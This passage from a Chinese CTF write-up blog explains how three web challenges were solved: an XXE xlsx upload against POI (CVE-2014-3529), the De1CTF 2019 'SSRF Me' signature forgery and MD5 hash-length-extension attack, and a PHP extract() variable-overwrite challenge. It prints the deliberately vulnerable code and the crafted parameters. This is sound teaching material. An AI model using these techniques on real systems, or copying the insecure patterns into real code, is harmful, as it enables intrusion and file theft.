ServletFileUpload((FileItemFactory)factory);<br>     upload.setHeaderEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>     upload.setFileSizeMax(<span class="hljs-number">1048576L</span>);<br>     upload.setSizeMax(<span class="hljs-number">10485760L</span>);<br>     <span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request))<br>       <span class="hljs-keyword">return</span>; <br>     List&lt;FileItem&gt; list = upload.parseRequest(request);<br>     <span class="hljs-keyword">for</span> (FileItem fileItem : list) &#123;<br>       <span class="hljs-keyword">if</span> (fileItem.isFormField()) &#123;<br>         String name = fileItem.getFieldName();<br>         String str = fileItem.getString(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>         <span class="hljs-keyword">continue</span>;<br>       &#125; <br>       String filename = fileItem.getName();<br>       <span class="hljs-keyword">if</span> (filename == <span class="hljs-keyword">null</span> || filename.trim().equals(<span class="hljs-string">&quot;&quot;</span>))<br>         <span class="hljs-keyword">continue</span>; <br>       String fileExtName = filename.substring(filename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>       InputStream in = fileItem.getInputStream();<br>       <span class="hljs-comment">//注意看这里***************************************************</span><br>       <span class="hljs-keyword">if</span> (filename.startsWith(<span class="hljs-string">&quot;excel-&quot;</span>) &amp;&amp; <span class="hljs-string">&quot;xlsx&quot;</span>.equals(fileExtName))<br>         <span class="hljs-keyword">try</span> &#123;<br>           Workbook wb1 = WorkbookFactory.create(in);<br>           Sheet sheet = wb1.getSheetAt(<span class="hljs-number">0</span>);<br>           System.out.println(sheet.getFirstRowNum());<br>         &#125; <span class="hljs-keyword">catch</span> (InvalidFormatException e) &#123;<br>           System.err.println(<span class="hljs-string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);<br>           e.printStackTrace();<br>         &#125;  <br>       String saveFilename = makeFileName(filename);<br>       request.setAttribute(<span class="hljs-string">&quot;saveFilename&quot;</span>, saveFilename);<br>       request.setAttribute(<span class="hljs-string">&quot;filename&quot;</span>, filename);<br>       String realSavePath = makePath(saveFilename, savePath);<br>       FileOutputStream out = <span class="hljs-keyword">new</span> FileOutputStream(realSavePath + <span class="hljs-string">&quot;/&quot;</span> + saveFilename);<br>       <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>       <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">while</span> ((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>)<br>         out.write(buffer, <span class="hljs-number">0</span>, len); <br>       in.close();<br>       out.close();<br>       message = <span class="hljs-string">&quot;;</span><br><span class="hljs-string">     &#125; </span><br><span class="hljs-string">   &#125; catch (FileUploadException e) &#123;</span><br><span class="hljs-string">     e.printStackTrace();</span><br><span class="hljs-string">   &#125; </span><br><span class="hljs-string">   request.setAttribute(&quot;</span>message<span class="hljs-string">&quot;, message);</span><br><span class="hljs-string">   request.getRequestDispatcher(&quot;</span>/ListFileServlet<span class="hljs-string">&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="hljs-string"> &#125;</span><br></code></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1668912">CVE-2014-3529</a></p><p>接下来就是制作存在XXE的xlsx文件，直接读取<code>/flag</code>（之前在任意读取时，测试发现这个文件被ban掉了）</p><p>制作的时候需要注意，xlsx改后缀为zip文件后，直接用winrar打开后在内部修改，解压后再压缩可能出现问题。</p><p>最后打出flag。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /></p><h2 id="代码审计">6、代码审计</h2><h3 id="de1ctf-2019ssrf-me代码审计哈希扩展攻击">1、[De1ctf 2019]SSRF Me（代码审计/哈希扩展攻击）</h3><p>首先看源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><span class="hljs-comment"># import importlib</span><br><br><br><span class="hljs-comment"># importlib.</span><br><span class="hljs-comment"># reload(sys)</span><br><span class="hljs-comment"># sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()): <span class="hljs-comment"># 校验hash</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<span class="hljs-comment"># 读取url内容，存储到文件中</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<span class="hljs-comment"># 读取文件内容</span><br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><span class="hljs-comment"># 校验签名</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 生成签名</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 实现SSRF的关键点</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world!&quot;</span><br><br><span class="hljs-comment"># 访问对应param的内容</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-comment"># 计算签名</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-number">7781</span>)<br></code></pre></td></tr></table></figure><p>首先阅读源代码之后，我们能够梳理出大致逻辑</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">geneSign -&gt; 生成签名（param自选，<span class="hljs-keyword">action</span>=<span class="hljs-built_in">scan</span>）<br>校验签名 -&gt; 将上传的签名和计算的签名（param自选，<span class="hljs-keyword">action</span>自选）<br><span class="hljs-built_in">scan</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 访问并读取到文件中<br>read <span class="hljs-keyword">in</span> <span class="hljs-keyword">action</span> -&gt; 读取文件<br></code></pre></td></tr></table></figure><h4 id="解法一字符串拼接">解法一、字符串拼接</h4><p>审计下来，发现代码中比较可疑的点在于scan 和 read 的判断是<code>in action</code>，并且两者是独立的分支结构。</p><p>同时签名验证的核心其实是</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">key + para<span class="hljs-name">m0</span> + <span class="hljs-string">&#x27;scan&#x27;</span> = key + para<span class="hljs-name">m1</span> + actio<span class="hljs-symbol">n1</span><br></code></pre></td></tr></table></figure><p>那么，我们可以构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param0</span> = flag.txtread<br><br><span class="hljs-attr">param1</span> = flag.txt<br><span class="hljs-attr">action1</span> = readscan<br></code></pre></td></tr></table></figure><p>这样我们就成功地实现了read的功能，最后得到flag。</p><h4 id="解法二哈希扩展攻击">解法二、哈希扩展攻击</h4><p>推荐阅读博客：</p><p><a href="https://joychou.org/web/hash-length-extension-attack.html">md5 hash attack</a></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018005050116.png" alt="image-20221018005050116" style="zoom: 67%;" /></p><p>如果有了这样的攻击手段，那我们就可以在不知道secret_key的情况下，把read加入我们的sign中，也能实现攻击。</p><p>需要注意的是此处必须是salt + message，如果顺序颠倒，则无法实现md5hash扩展攻击。</p><p>利用现成的脚本:</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">28 </span>= <span class="hljs-keyword">len</span>(secret_key) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>) + <span class="hljs-keyword">len</span>(<span class="hljs-string">&quot;read&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /></p><p>将生成的结果注入，注意要在action前面加上scan</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">param</span>=flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /></p><h3 id="gfctf-baby_web变量覆盖">2、GFCTF-Baby_Web（变量覆盖）</h3><p>这道题主要考察PHP源码审计的能力，当然要想做出来这道题，还是需要一些额外的技巧。</p><p><code>F12</code>发现源代码，暗示存在路径穿越。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome To GFCTF 12th!!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-comment">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></code></pre></td></tr></table></figure><p>这也没有可以注入的参数，于是先dirsearch扫一下，直接扫出来了</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013-0001.png" alt="blog0013_0001" style="zoom:80%;" /></p><p>直接上BP</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/blog0013_0002.png" alt="blog0013_0002" style="zoom: 50%;" /></p><p>于是把源代码扒下来，接下来就是变量覆盖的事了。</p><p>先看文件包含这一块：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>defined(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Temp</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;date = array_merge(<span class="hljs-keyword">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$dir</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = str_replace(<span class="hljs-string">&#x27;..&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;./template/admin/&#x27;</span>.<span class="hljs-variable">$template</span>);<br>            <span class="hljs-keyword">if</span>(!is_file(<span class="hljs-keyword">$this</span>-&gt;template))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;template = <span class="hljs-string">&#x27;./template/index.html&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"><span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        extract(<span class="hljs-keyword">$this</span>-&gt;date);<span class="hljs-comment">//文件包含入口</span><br>        <span class="hljs-keyword">$this</span>-&gt;getTempName(<span class="hljs-variable">$template</span>,<span class="hljs-variable">$space</span>);<br>        <span class="hljs-keyword">include</span>(<span class="hljs-keyword">$this</span>-&gt;template);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单理解就是，我们需要有<code>$space</code>变量，才能完成文件包含，于是我们直接POST上去，由于<code>extract</code>的作用，实现了变量覆盖，使得文件<code>/templace/admin/index.html</code>能够被包含。</p><p>于是走到最后一步：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;listdata(<span class="hljs-string">&quot;action=list module=<span class="hljs-subst">$mod</span>&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对应的后端源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listdata</span>(<span class="hljs-params"><span class="hljs-variable">$_params</span></span>)</span>&#123;<br>       <span class="hljs-variable">$system</span> = [<br>           <span class="hljs-string">&#x27;db&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;app&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;num&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sum&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;form&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;page&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;not_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;show_flag&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;more&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;catid&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;field&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;order&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;space&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;table_site&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;total&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;join&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;on&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;sbpage&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;urlrule&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagesize&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>           <span class="hljs-string">&#x27;pagefile&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>       ];<br><br>       <span class="hljs-variable">$param</span> = <span class="hljs-variable">$where</span> = [];<br><br>       <span class="hljs-variable">$_params</span> = trim(<span class="hljs-variable">$_params</span>);<span class="hljs-comment">//去除头尾的空白符</span><br><br>       <span class="hljs-variable">$params</span> = explode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$_params</span>);<br>       <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>], [<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;function&#x27;</span>])) &#123;<br>           <span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;action=&#x27;</span>.<span class="hljs-variable">$params</span>[<span class="hljs-number">0</span>];<br>       &#125;<br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$t</span>) &#123;<br>           <span class="hljs-variable">$var</span> = substr(<span class="hljs-variable">$t</span>, <span class="hljs-number">0</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>));<br>           <span class="hljs-variable">$val</span> = substr(<span class="hljs-variable">$t</span>, strpos(<span class="hljs-variable">$t</span>, <span class="hljs-string">&#x27;=&#x27;</span>) + <span class="hljs-number">1</span>);<br>           <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$var</span>) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>])) &#123; <br>               <span class="hljs-variable">$system</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;   <span class="hljs-comment">//实现系统变量覆盖，覆盖action</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable">$param</span>[<span class="hljs-variable">$var</span>] = <span class="hljs-variable">$val</span>;    <span class="hljs-comment">//存放自己设置的变量</span><br>           &#125;<br>       